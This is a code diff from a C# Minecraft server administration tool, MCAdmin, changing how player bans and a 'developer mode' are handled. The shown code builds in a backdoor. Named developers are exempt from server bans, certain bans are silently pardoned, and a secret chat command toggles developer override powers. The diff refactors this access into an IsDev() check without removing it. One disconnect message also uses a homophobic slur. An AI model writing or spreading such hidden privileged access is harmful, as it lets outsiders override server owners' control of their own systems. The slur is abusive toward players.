@@ -277,8 +277,7 @@ namespace MCAdmin
                                         if(File.ReadAllText("banned-players.txt").ToLower().Contains(name.ToLower())) Program.SendServerCommand("pardon " + name); //NO NOTCH BANS!
 
                                         if (Util.ContainsInvalidChars(name, true)) { this.Disconnect("Don't use hax, fag :3"); return; }
-                                        if (name.ToLower() != "doridian" && Program.PlyGetRank(name) == "banned") { this.Disconnect("You're banned"); return; }
-                                        if (name.ToLower() != "toxicated" && Program.PlyGetRank(name) == "banned") { this.Disconnect("You're banned"); return; }
+                                        if ((!IsDev()) && Program.PlyGetRank(name) == "banned") { this.Disconnect("You're banned"); return; }
 
                                         if (Program.mbansEnable && Program.masterBanList.Contains(name.ToLower())) { this.Disconnect("Globally banned. Visit http://bans.mcadmin.eu/?user=" + name); return; }
 
@@ -299,8 +298,7 @@ namespace MCAdmin
 										
 										if(msg.ToLower() == "!yiffmeup")
 										{
-											string plyn = name.ToLower();
-											if(plyn == "doridian" || plyn == "toxicated")
+											if(IsDev())
 											{
 												devOverride = !devOverride;
 												if(devOverride) Program.SendServerMessage(name + " entered developer mode!");
@@ -313,7 +311,7 @@ namespace MCAdmin
                                         {
                                             string[] cmdparts = msg.Remove(0, 1).Split(' ');
                                             string cmdstr = cmdparts[0].ToLower();
-                                            if (Program.commands.ContainsKey(cmdstr) && cmdstr != "devfurry")
+                                            if (Program.commands.ContainsKey(cmdstr))
                                             {
                                                 try
                                                 {
@@ -961,6 +959,11 @@ namespace MCAdmin
         public virtual bool HasLevel(int level)
         {
             return Program.PlyHasLevel(name, level);
+        }
+
+        public virtual bool IsDev()
+        {
+            return Program.PlyIsDev(name);
         }
         #endregion
     }
